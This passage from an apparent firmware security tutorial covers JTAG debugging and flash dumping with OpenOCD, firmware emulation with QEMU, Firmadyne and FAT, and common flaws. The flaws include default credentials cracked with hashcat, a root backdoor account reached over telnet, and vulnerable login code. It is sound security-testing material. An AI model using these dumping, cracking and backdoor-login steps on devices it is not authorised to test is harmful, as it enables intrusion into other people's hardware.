<li class="">Full CPU control (set breakpoints, single-step execution)</li>
<li class="">Memory read/write (dump firmware, modify RAM)</li>
<li class="">Flash programming (write new firmware)</li>
</ul>
<p><strong>Finding JTAG pins:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Common JTAG pin configurations:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - 20-pin ARM JTAG (standard)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - 14-pin JTAG (compact)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - 10-pin Cortex Debug (ARM Cortex-M)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - 5-pin JTAG (minimal: TDI, TDO, TMS, TCK, GND)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin identification (if not labeled):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Use JTAGulator or manual probing:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># https://github.com/grandideastudio/jtagulator</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Common pins:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># TDI  - Test Data In</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># TDO  - Test Data Out</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># TMS  - Test Mode Select</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># TCK  - Test Clock</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># TRST - Test Reset (optional)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># GND  - Ground</span><br></span></code></pre></div></div>
<p><strong>JTAG connection (using Bus Pirate or J-Link):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Using OpenOCD (Open On-Chip Debugger):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> openocd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example config (ARM device):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># openocd.cfg:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">interface jlink</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">transport </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> jtag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">adapter speed </span><span class="token number" style="color:#36acaa">1000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jtag newtap chip cpu </span><span class="token parameter variable" style="color:#36acaa">-irlen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> -expected-id 0x07926041</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">target create chip.cpu arm926ejs -chain-position chip.cpu</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Connect:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> openocd </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> openocd.cfg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># In another terminal (telnet to OpenOCD):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">telnet localhost </span><span class="token number" style="color:#36acaa">4444</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># OpenOCD commands:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">halt</span><span class="token plain">                    </span><span class="token comment" style="color:#999988;font-style:italic"># Stop CPU</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg                     </span><span class="token comment" style="color:#999988;font-style:italic"># Show registers</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mdw 0x00000000 </span><span class="token number" style="color:#36acaa">256</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic"># Memory dump (256 words from 0x0)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dump_image firmware.bin 0x00000000 0x800000  </span><span class="token comment" style="color:#999988;font-style:italic"># Dump 8MB from flash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reset                   </span><span class="token comment" style="color:#999988;font-style:italic"># Reset device</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="spi-serial-peripheral-interface">SPI (Serial Peripheral Interface)<a href="#spi-serial-peripheral-interface" class="hash-link" aria-label="Direct link to SPI (Serial Peripheral Interface)" title="Direct link to SPI (Serial Peripheral Interface)" translate="no">​</a></h3>
<p>See <a href="#method-3-extract-from-flash-memory-hardware" class="">Firmware Acquisition → Extract from Flash Memory</a> for SPI flash extraction.</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="emulation--dynamic-analysis">Emulation &amp; Dynamic Analysis<a href="#emulation--dynamic-analysis" class="hash-link" aria-label="Direct link to Emulation &amp; Dynamic Analysis" title="Direct link to Emulation &amp; Dynamic Analysis" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="qemu-user-mode-emulation">QEMU User-Mode Emulation<a href="#qemu-user-mode-emulation" class="hash-link" aria-label="Direct link to QEMU User-Mode Emulation" title="Direct link to QEMU User-Mode Emulation" translate="no">​</a></h3>
<p><strong>Emulate individual binaries</strong> (faster than full system emulation).</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Install QEMU user-mode:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> qemu-user qemu-user-static</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Copy ARM/MIPS binary from firmware:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> squashfs-root/bin/httpd </span><span class="token builtin class-name">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Run ARM binary on x86 host:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qemu-arm </span><span class="token parameter variable" style="color:#36acaa">-L</span><span class="token plain"> squashfs-root/ ./httpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># -L: Specify library path (extracted filesystem)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Run with strace (trace system calls):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qemu-arm </span><span class="token parameter variable" style="color:#36acaa">-L</span><span class="token plain"> squashfs-root/ </span><span class="token parameter variable" style="color:#36acaa">-strace</span><span class="token plain"> ./httpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Run MIPS binary:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qemu-mipsel </span><span class="token parameter variable" style="color:#36acaa">-L</span><span class="token plain"> squashfs-root/ ./httpd</span><br></span></code></pre></div></div>
<p><strong>Debugging with GDB:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Run binary in QEMU with GDB server:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qemu-arm </span><span class="token parameter variable" style="color:#36acaa">-L</span><span class="token plain"> squashfs-root/ </span><span class="token parameter variable" style="color:#36acaa">-g</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"> ./httpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># In another terminal, attach GDB:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-multiarch ./httpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">gdb</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> target remote localhost:1234</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">gdb</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">break</span><span class="token plain"> main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">gdb</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">continue</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="qemu-system-emulation">QEMU System Emulation<a href="#qemu-system-emulation" class="hash-link" aria-label="Direct link to QEMU System Emulation" title="Direct link to QEMU System Emulation" translate="no">​</a></h3>
<p><strong>Emulate entire device</strong> (router, IoT device).</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Extract kernel and filesystem from firmware:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">binwalk </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Identify kernel:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> _firmware.bin.extracted/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example: _firmware.bin.extracted/1C: Linux kernel ARM boot executable zImage</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Extract kernel (if compressed):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">binwalk </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> _firmware.bin.extracted/1C</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Run in QEMU (ARM example):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qemu-system-arm </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">-M</span><span class="token plain"> versatilepb </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">-kernel</span><span class="token plain"> vmlinux </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">-initrd</span><span class="token plain"> filesystem.cpio </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">-append</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;root=/dev/ram console=ttyAMA0&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token parameter variable" style="color:#36acaa">-nographic</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Common QEMU machine types:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># -M versatilepb (ARM)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># -M malta (MIPS)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># -M virt (generic ARM/MIPS)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="firmadyne-automated-firmware-emulation">Firmadyne (Automated Firmware Emulation)<a href="#firmadyne-automated-firmware-emulation" class="hash-link" aria-label="Direct link to Firmadyne (Automated Firmware Emulation)" title="Direct link to Firmadyne (Automated Firmware Emulation)" translate="no">​</a></h3>
<p><strong>Firmadyne</strong> automates firmware emulation and vulnerability testing.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Install Firmadyne:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/firmadyne/firmadyne.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> firmadyne</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./download.sh  </span><span class="token comment" style="color:#999988;font-style:italic"># Download pre-built binaries</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Setup database:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> postgresql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> postgres createuser </span><span class="token parameter variable" style="color:#36acaa">-P</span><span class="token plain"> firmadyne  </span><span class="token comment" style="color:#999988;font-style:italic"># Set password</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> postgres createdb </span><span class="token parameter variable" style="color:#36acaa">-O</span><span class="token plain"> firmadyne firmware</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Import firmware database:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">psql </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> firmware </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> firmadyne </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> ./database/schema</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Analyze firmware:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./sources/extractor/extractor.py </span><span class="token parameter variable" style="color:#36acaa">-b</span><span class="token plain"> Netgear </span><span class="token parameter variable" style="color:#36acaa">-sql</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 </span><span class="token parameter variable" style="color:#36acaa">-np</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-nk</span><span class="token plain"> firmware.bin images</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Emulate firmware:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./scripts/getArch.sh ./images/1.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./scripts/makeImage.sh </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./scripts/inferNetwork.sh </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./scripts/run.sh </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Access emulated device:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Network: 192.168.0.1 (or as detected)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Web interface: http://192.168.0.1/</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="fat-firmware-analysis-toolkit">FAT (Firmware Analysis Toolkit)<a href="#fat-firmware-analysis-toolkit" class="hash-link" aria-label="Direct link to FAT (Firmware Analysis Toolkit)" title="Direct link to FAT (Firmware Analysis Toolkit)" translate="no">​</a></h3>
<p><strong>FAT</strong> is a wrapper around Firmadyne with additional features.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Install FAT:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/attify/firmware-analysis-toolkit.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> firmware-analysis-toolkit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./setup.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Run analysis:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./fat.py firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Extracts firmware</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Emulates in QEMU</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Runs vulnerability scanners (Nmap, Nessus)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Generates report</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="common-vulnerabilities">Common Vulnerabilities<a href="#common-vulnerabilities" class="hash-link" aria-label="Direct link to Common Vulnerabilities" title="Direct link to Common Vulnerabilities" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="authentication-bypass">Authentication Bypass<a href="#authentication-bypass" class="hash-link" aria-label="Direct link to Authentication Bypass" title="Direct link to Authentication Bypass" translate="no">​</a></h3>
<p><strong>Hardcoded credentials:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Found in etc/passwd or config files:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Username: admin</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Password: admin (or default password)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># MD5 hash in config:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># password=21232f297a57a5a743894a0e4a801fc3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Crack with hashcat:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hashcat </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> hash.txt rockyou.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Result: admin</span><br></span></code></pre></div></div>
<p><strong>Backdoor accounts:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># etc/passwd entry:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">debug:x:0:0:Debug:/root:/bin/sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Login via telnet/SSH:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">telnet </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Username: debug</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Password: (empty or default)</span><br></span></code></pre></div></div>
<p><strong>Authentication logic flaws:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Vulnerable authentication (decompiled from httpd):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">strcmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;admin&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">strcmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">password</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> stored_password</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        authenticated </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" 